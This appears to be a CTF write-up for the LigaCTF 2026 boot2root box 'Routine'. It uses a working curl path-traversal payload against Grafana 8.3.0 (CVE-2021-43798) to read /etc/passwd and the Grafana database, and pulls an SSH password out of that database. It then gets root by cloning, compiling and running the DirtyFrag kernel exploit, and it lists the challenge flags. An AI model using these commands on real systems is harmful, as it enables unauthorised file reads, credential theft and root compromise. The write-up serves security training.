---
slug: "local-ctf/ligactf2026/routine"
event: "ligactf-2026"
title: "Routine"
summary: "LigaCTF 2026 ligactf2026, forensics, cryptography writeup covering Routine with analysis, solution steps, and final recovery notes."
date: 2026-05-31
tags:
  - ctf
  - ligactf2026
  - forensics
  - cryptography
  - boot2root
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
boxImage: "https://owasp.org/www-chapter-kuala-lumpur/owaspmy.jpeg"
---
## Challenge Information

| Field       | Value                                       |
| ----------- | ------------------------------------------- |
| Challenge   | Routine                                     |
| Category    | Boot2Root / Linux                           |
| Target IP   | `[REDACTED_LOCAL_IP]`                            |
| Attacker OS | Kali Linux                                  |
| User Flag   | `OWASPKL{496d5373e7501c9aab3b2658bbad4c02}` |
| Root Flag   | `OWASPKL{b0f8c51049b9db31552bda1bd751940a}` |

---

## 1. Reconnaissance

A full TCP scan was performed against the target.

```bash
sudo nmap -Pn -n -p- --min-rate 3000 [REDACTED_LOCAL_IP] -oN full_ports.txt
```

Open ports found:

![pasted-image-20260531132826](/images/writeups/local-ctf/ligactf2026/routine/pasted-image-20260531132826.png)

A service/version scan was then executed:

```bash
ports=$(grep -oP '^\d+(?=/tcp\s+open)' full_ports.txt | paste -sd, -)
sudo nmap -Pn -n -sV -sC -p "$ports" [REDACTED_LOCAL_IP] -oN enum.txt
```

Result:

![pasted-image-20260531132938](/images/writeups/local-ctf/ligactf2026/routine/pasted-image-20260531132938.png)

Port `3000` hosted a Grafana login page.

---

## 2. Grafana Enumeration

The Grafana API health endpoint disclosed the version.

```bash
curl -s http://[REDACTED_LOCAL_IP]:3000/api/health | jq .
```

Output:

![pasted-image-20260531133017](/images/writeups/local-ctf/ligactf2026/routine/pasted-image-20260531133017.png)

Grafana `8.3.0` is vulnerable to **CVE-2021-43798**, an unauthenticated path traversal vulnerability that can read local files through installed plugin paths.

Vulnerability details:

|Item|Value|
|---|---|
|CVE|CVE-2021-43798|
|Weakness|CWE-22 Path Traversal|
|CVSS|7.5 High|
|Affected Versions|Grafana 8.0.0-beta1 to 8.3.0|
|Fixed Versions|8.0.7, 8.1.8, 8.2.7, 8.3.1|

---

## 3. Exploiting Grafana File Read

The path traversal was tested by reading `/etc/passwd`.

```bash
export URL=http://[REDACTED_LOCAL_IP]:3000

curl -s --path-as-is \
"$URL/public/plugins/alertlist/../../../../../../../../etc/passwd" | head
```

Output confirmed successful file read:

![pasted-image-20260531133050](/images/writeups/local-ctf/ligactf2026/routine/pasted-image-20260531133050.png)

The Grafana database was then downloaded.

```bash
mkdir -p loot

curl -s --path-as-is \
"$URL/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" \
-o loot/grafana.db
```

The downloaded file was confirmed as a SQLite database.

```bash
file loot/grafana.db
```

![pasted-image-20260531133123](/images/writeups/local-ctf/ligactf2026/routine/pasted-image-20260531133123.png)

---

## 4. Credential Extraction

The database tables were inspected.

```bash
sqlite3 loot/grafana.db ".tables"
```

![pasted-image-20260531133146](/images/writeups/local-ctf/ligactf2026/routine/pasted-image-20260531133146.png)

Interesting credential data was found by querying the `credentials` table.

```bash
	sqlite3 loot/grafana.db "select * from credentials;"
```

Output:

![pasted-image-20260531133206](/images/writeups/local-ctf/ligactf2026/routine/pasted-image-20260531133206.png)

The credentials were tested over SSH. The valid credential was:

```text
tellytubby:V4lor4nt-Anti-cHEAT
```

---

## 5. Initial Foothold

SSH login was successful as `tellytubby`.

```bash
ssh tellytubby@[REDACTED_LOCAL_IP]
```

![pasted-image-20260531133247](/images/writeups/local-ctf/ligactf2026/routine/pasted-image-20260531133247.png)

After logging in, the local flag was found in the user home directory.

```bash
ls -la
cat local.txt
```

Output:

![pasted-image-20260531133311](/images/writeups/local-ctf/ligactf2026/routine/pasted-image-20260531133311.png)

```text
OWASPKL{496d5373e7501c9aab3b2658bbad4c02}
```

---

## 6. Privilege Escalation Enumeration

Basic host information was collected.

```bash
id
hostname
uname -a
cat /etc/os-release
sudo -l
```

Output:

![pasted-image-20260531133348](/images/writeups/local-ctf/ligactf2026/routine/pasted-image-20260531133348.png)

```text
uid=1003(tellytubby) gid=1003(tellytubby) groups=1003(tellytubby)
routine
Linux routine 7.0.0-15-generic x86_64 GNU/Linux
Ubuntu 26.04 LTS
sudo: Sorry, user tellytubby may not run sudo on routine.
```

The user had no sudo privileges.

SUID binaries and Linux capabilities were checked.

```bash
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

A writable backup script was also found:

```text
/home/tellytubby/Downloads/userbackup.py
```

However, no active cron or systemd execution path was confirmed for the script.

The kernel version was then checked against public local privilege escalation vulnerabilities. The target was running:

```text
Linux 7.0.0-15-generic
```

This kernel was vulnerable to the DirtyFrag local privilege escalation chain.

DirtyFrag details:

|Item|Value|
|---|---|
|Vulnerability Class|Linux kernel local privilege escalation|
|Related CVEs|CVE-2026-43284, CVE-2026-43500|
|Weakness|CWE-123 / CWE-787|
|Exploitability|Local authenticated user required|
|Impact|Root privilege escalation|

---

## 7. DirtyFrag Exploitation

The target did not have `gcc`, and `/tmp` was full.

```bash
which gcc git make python3
df -h /tmp /home /dev/shm
```

Output showed:

```text
/usr/bin/git
/usr/bin/python3
/tmp 100% used
gcc not found
```

Because of this, the exploit was compiled on Kali instead of the target.

On Kali:

```bash
cd ~/Desktop/LigaCTF2026/Boot2Root/Routine
rm -rf dirtyfrag
git clone https://github.com/V4bel/dirtyfrag.git
cd dirtyfrag

gcc -O0 -Wall -o exp exp.c -lutil
file exp
```

![pasted-image-20260531133456](/images/writeups/local-ctf/ligactf2026/routine/pasted-image-20260531133456.png)

The compiled binary was uploaded to the target user directory instead of `/tmp`.

```bash
scp exp tellytubby@[REDACTED_LOCAL_IP]:/home/tellytubby/Downloads/exp
```

![pasted-image-20260531133509](/images/writeups/local-ctf/ligactf2026/routine/pasted-image-20260531133509.png)

On the target:

```bash
cd /home/tellytubby/Downloads
chmod +x exp
./exp
id
```

The exploit successfully spawned a root shell.

![pasted-image-20260531133541](/images/writeups/local-ctf/ligactf2026/routine/pasted-image-20260531133541.png)

```text
root@routine:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 8. Root Flag

The root proof file was located in `/root`.

```bash
ls
cat proof.txt
```

Output:

![pasted-image-20260531133604](/images/writeups/local-ctf/ligactf2026/routine/pasted-image-20260531133604.png)

```text
OWASPKL{b0f8c51049b9db31552bda1bd751940a}
```

---

## 9. Attack Chain Summary

```text
1. Performed full TCP scan with Nmap.
2. Found SSH on port 22 and Grafana on port 3000.
3. Identified Grafana version 8.3.0 through /api/health.
4. Exploited CVE-2021-43798 to read local files.
5. Downloaded /var/lib/grafana/grafana.db.
6. Extracted user credentials from the Grafana database.
7. Logged in over SSH as tellytubby.
8. Captured the user flag from /home/tellytubby/local.txt.
9. Enumerated the host and identified vulnerable Linux kernel 7.0.0-15.
10. Compiled DirtyFrag exploit on Kali because the target had no gcc.
11. Uploaded the exploit to /home/tellytubby/Downloads.
12. Ran DirtyFrag and gained root.
13. Read /root/proof.txt.
```

---
